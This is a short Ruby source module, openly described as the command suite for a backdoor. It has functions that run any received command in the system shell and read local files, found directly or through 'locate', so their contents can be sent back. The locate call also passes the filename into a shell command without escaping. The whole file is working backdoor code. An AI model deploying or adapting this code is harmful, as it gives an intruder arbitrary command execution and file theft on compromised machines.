#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# Commands
#
# Author: Karl Castillo
#
# Date: November 20, 2012
#
# Notes:
# Commands suite and helper functions for the backdoor.
#-------------------------------------------------------------------------------
module Commands
    #---------------------------------------------------------------------------
    # run_command
    #
    # Author: Karl Castillo
    #
    # Date: November 20, 2012
    #
    # Arguments:
    # cmd: the command that will be run
    #
    # Return:
    # <s>: result of the command on success
    # <s>: errir string on failure
    #
    # Notes:
    # Runs the command on the shell
    #---------------------------------------------------------------------------
    def run_command(cmd)
        begin
            return `#{cmd}`
        rescue Exception => e
            return e.to_s
        end # rescue
    end
    
    #---------------------------------------------------------------------------
    # get_command
    #
    # Author: Karl Castillo
    # 
    # Date: November 20, 2012
    #
    # Arguments:
    # filename - filename and path of the file that will be sent
    #
    # Return:
    # <s>: contents of the file on success
    # <s>: error string on failure
    #
    # Notes:
    # Open and read the file that will be sent.
    #---------------------------------------------------------------------------
    def get_command(filename)
        if File.exist?(filename) then
            file = File.open(filename, "rb")
            content = file.read
            file.close
            return content
        else # exist?
            return "File: #{filename} not readable."
        end # exist? else
    end
    
    #---------------------------------------------------------------------------
    # get_locate_command
    #
    # Author: Karl Castillo
    #
    # Date: November 20, 2012
    #
    # Arguments:
    # filename - filename and path of the file that will be sent
    #
    # Return:
    # <s>: contents of the file in success
    # <s>: error string in failure
    #
    # Notes:
    # Uses locate to find the file. Only uses the first found file.
    #---------------------------------------------------------------------------
    def get_locate_command(filename)
        begin
            name = `locate -n 1 #{filename}`
        rescue Exception => e
            return e.to_s
        end # rescue       

	name = name.chomp

        if name.empty? or !File.exist?(name.to_s) then
            return "File: #{name} does not exist."
        else # exist?
            file = File.open(name.to_s, "rb")
            content = file.read
            file.close
            return content
        end # empty? else
    end # get_locate_command
end # Commands
